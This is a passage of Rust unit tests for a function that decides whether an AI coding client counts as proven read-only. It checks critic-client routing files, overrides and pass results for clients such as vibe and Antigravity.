fn reads_an_override_that_adds_a_client_and_ignores_one_that_is_not_an_object() {
    let added = r#"{"clients":{"vibe-new":{"kind":"vibe","model":"mistral-medium-4-1"},"bad":3}}"#;
    let passed = results("pass", "vibe-new");
    assert_eq!(read_only_proof(&files(Some(ROUTING), Some(added), Some(&passed)), "mistral-medium-4-1", &[], "vibe"), proven("vibe-new"));
    assert!(is_unproven(read_only_proof(&files(Some(ROUTING), Some("[]"), None), "zai-glm-5-3", &[], "vibe")));
    assert!(is_unproven(read_only_proof(&files(Some(r#"{"clients":3}"#), Some(r#"{"clients":[]}"#), None), "zai-glm-5-3", &[], "vibe")));
}

#[test]
fn the_first_critic_client_in_name_order_is_the_one_whose_proof_counts() {
    let routing = r#"{"clients":{"vibe-b":{"kind":"vibe","model":"m"},"vibe-a":{"kind":"vibe","model":"m"},"vibe-c":{"kind":"vibe","model":"other"}}}"#;
    let passed = results("pass", "vibe-a");
    assert_eq!(read_only_proof(&files(Some(routing), None, Some(&passed)), "m", &[], "vibe"), proven("vibe-a"));
}

#[test]
fn the_proof_of_antigravity_is_its_critic_client_that_runs_the_gemini_model() {
    let passed = results("pass", "agy-gemini-flash-high");
    let proof_files = files(Some(ROUTING), None, Some(&passed));
    assert_eq!(read_only_proof(&proof_files, "gemini-3.8-flash-high", &[], "agy"), proven("agy-gemini-flash-high"));
    assert!(is_unproven(read_only_proof(&proof_files, "gemini-3.8-flash-high", &[], "vibe")));
    assert_eq!(
        read_only_proof(&proof_files, "zai-glm-5-3", &[], "agy"),
        unproven_because("no Antigravity critic client in critique's routing runs zai-glm-5-3")
    );
    assert_eq!(
        read_only_proof(&files(None, None, None), "gemini-3.8-flash-high", &[], "agy"),
        unproven_because("critique's routing is not installed, so no Antigravity critic client proves a model read-only")
    );
}

#[test]
fn a_client_with_no_critic_client_is_never_proven_whatever_the_files_hold() {
    let passed = results("pass", "claude-sonnet");
    let proof_files = files(Some(ROUTING), None, Some(&passed));
    for client in ["claude", "opencode", "codex", "hermes"] {
        assert_eq!(
            read_only_proof(&proof_files, "claude-sonnet-5-5", &[], client),
            unproven_because(&format!("{client} has no critic client in critique's routing, so nothing proves it read-only"))
        );
    }
}
